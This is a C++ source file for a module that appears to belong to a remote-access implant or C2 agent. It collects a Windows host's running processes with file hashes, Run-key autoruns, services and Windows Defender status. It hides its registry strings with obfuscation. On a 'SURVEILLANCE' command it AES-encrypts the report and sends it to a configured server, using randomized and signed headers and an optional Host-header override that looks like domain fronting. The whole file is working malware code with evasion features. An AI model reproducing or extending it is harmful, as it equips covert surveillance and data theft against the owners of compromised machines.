#include "ActiveSurveillanceModule.h"
#include "Globals.h"
#include "Crypto.h"
#include "Obfuscation.h"
#include <curl/curl.h>
#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winreg.h>
#include <sstream>
#include <fstream>
#endif
#include <openssl/evp.h>
#include <vector>
#include <iomanip>
#include <iostream>

#ifdef _WIN32
static std::string sha256_file(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if(!f.is_open()) return "";
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)), {});
    unsigned char hash[32];
    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);
    EVP_DigestUpdate(ctx, data.data(), data.size());
    EVP_DigestFinal_ex(ctx, hash, NULL);
    EVP_MD_CTX_free(ctx);
    std::ostringstream oss;
    for(int i=0;i<32;++i) oss<<std::hex<<std::setw(2)<<std::setfill('0')<<(int)hash[i];
    return oss.str();
}
#endif

nlohmann::json ActiveSurveillanceModule::collect() {
    nlohmann::json j;
#ifdef _WIN32
    // process list
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(snap != INVALID_HANDLE_VALUE){
        PROCESSENTRY32 pe{sizeof(pe)};
        if(Process32First(snap, &pe)){
            nlohmann::json arr = nlohmann::json::array();
            do{
                nlohmann::json p;
                p["name"] = pe.szExeFile;
                HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if(h){
                    char path[MAX_PATH];
                    if(GetModuleFileNameExA(h, NULL, path, MAX_PATH))
                        p["path"] = path;
                    p["sha256"] = sha256_file(path);
                    CloseHandle(h);
                }
                arr.push_back(p);
            } while(Process32Next(snap, &pe));
            j["processes"] = arr;
        }
        CloseHandle(snap);
    }
    // autoruns
    auto read_runkey=[&](HKEY root){
        HKEY key; nlohmann::json items=nlohmann::json::array();
        if(RegOpenKeyExA(root, OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_READ,&key)==ERROR_SUCCESS){
            char name[256]; char val[512]; DWORD nlen=256,vlen=512,idx=0;
            while(RegEnumValueA(key,idx,name,&nlen,NULL,NULL,(LPBYTE)val,&vlen)==ERROR_SUCCESS){
                nlohmann::json r; r["name"]=name; r["value"]=val; items.push_back(r); nlen=256;vlen=512;idx++; }
            RegCloseKey(key);
        }
        return items;
    };
    j["run_hklm"] = read_runkey(HKEY_LOCAL_MACHINE);
    j["run_hkcu"] = read_runkey(HKEY_CURRENT_USER);
    // services
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if(scm){
        DWORD needed=0,cnt=0;
        EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                              NULL,0,&needed,&cnt,NULL,NULL);
        std::vector<unsigned char> buf(needed);
        if(EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                                 buf.data(), buf.size(), &needed, &cnt, NULL, NULL)){
            LPENUM_SERVICE_STATUS_PROCESSA sp=(LPENUM_SERVICE_STATUS_PROCESSA)buf.data();
            nlohmann::json arr=nlohmann::json::array();
            for(DWORD i=0;i<cnt;++i){
                nlohmann::json s; s["name"]=sp[i].lpServiceName; s["state"]=sp[i].ServiceStatusProcess.dwCurrentState==SERVICE_RUNNING?"Running":"Stopped"; arr.push_back(s); }
            j["services"] = arr;
        }
        CloseServiceHandle(scm);
    }
    // defender
    HKEY def; if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBFUSCATE("Software\\Microsoft\\Windows Defender"),0,KEY_READ,&def)==ERROR_SUCCESS){
        DWORD val=0; DWORD len=sizeof(DWORD);
        if(RegQueryValueExA(def, OBFUSCATE("DisableAntiSpyware"),NULL,NULL,(LPBYTE)&val,&len)==ERROR_SUCCESS)
            j["defender_disabled"] = (val!=0);
        RegCloseKey(def);
    }
#endif
    return j;
}

static std::string base64_encode(const unsigned char* data,size_t len){
    int out_len=4*((len+2)/3); std::vector<unsigned char> out(out_len+1); EVP_EncodeBlock(out.data(), data, len); return std::string((char*)out.data(), out_len);
}

std::string ActiveSurveillanceModule::encrypt_report(const std::string& js){
    if(g_aes_key.empty()) return {};
    std::string iv(16,'\0'); for(int i=0;i<16;++i) iv[i]=rand()%256;
    std::vector<unsigned char> data(js.begin(), js.end());
    auto enc=Crypto::encrypt(data,g_aes_key,iv);
    std::vector<unsigned char> blob(iv.begin(),iv.end()); blob.insert(blob.end(),enc.begin(),enc.end());
    return base64_encode(blob.data(), blob.size());
}

void ActiveSurveillanceModule::init(){
    register_command("SURVEILLANCE", [this](const nlohmann::json& cmd){
        auto rep=collect();
        std::string j=rep.dump();
        std::string enc=encrypt_report(j);
        std::string url=g_agent_config.server_url + g_agent_config.path_prefix + OBFUSCATE("/surveillance_report/") + g_uuid;
        CURL* curl=curl_easy_init(); if(!curl) return; struct curl_slist* headers=g_header_randomizer.build_list();
        std::string body="{\"data\":\""+enc+"\"}";
        headers=g_request_signer.sign(headers,"POST",url,body);
        if(!g_agent_config.host_header.empty()) headers=curl_slist_append(headers,("Host: "+g_agent_config.host_header).c_str());
        curl_easy_setopt(curl,CURLOPT_HTTPHEADER,headers);
        curl_easy_setopt(curl,CURLOPT_URL,url.c_str());
        curl_easy_setopt(curl,CURLOPT_POSTFIELDS,body.c_str());
        curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    });
}

#ifndef STATIC_AGENT
extern "C" Module* create_module(){ return new ActiveSurveillanceModule(); }
#endif
